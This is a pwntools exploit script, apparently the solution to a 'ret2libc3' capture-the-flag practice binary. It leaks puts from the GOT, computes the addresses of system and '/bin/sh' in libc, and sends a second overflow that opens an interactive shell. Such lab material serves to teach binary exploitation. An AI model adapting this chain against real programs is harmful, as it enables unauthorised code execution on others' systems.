from pwn import *
from LibcSearcher import *
p=process('./ret2libc3')
ret2libc3=ELF('./ret2libc3')
gdb.attach(p)
puts_addr_plt=ret2libc3.plt['puts']
puts_addr_got=ret2libc3.got['puts']
main_addr=ret2libc3.symbols['main']
payload1='a'*112+p32(puts_addr_plt)+p32(main_addr)+p32(puts_addr_got)
p.sendline(payload1)
puts_addr=u32(p.recv()[0:4])
print (puts_addr)
libc=ELF('/usr/lib/i386-linux-gnu/libc-2.29.so')
puts_sys_addr=libc.symbols['puts']-libc.symbols['system']
system_addr=puts_addr-puts_sys_addr
puts_binsh_addr=libc.symbols['puts']-libc.search('/bin/sh').next()
binsh_addr=puts_addr-puts_binsh_addr
payload='a'*104+p32(system_addr)+'aaaa'+p32(binsh_addr)
p.sendline(payload)
p.interactive()
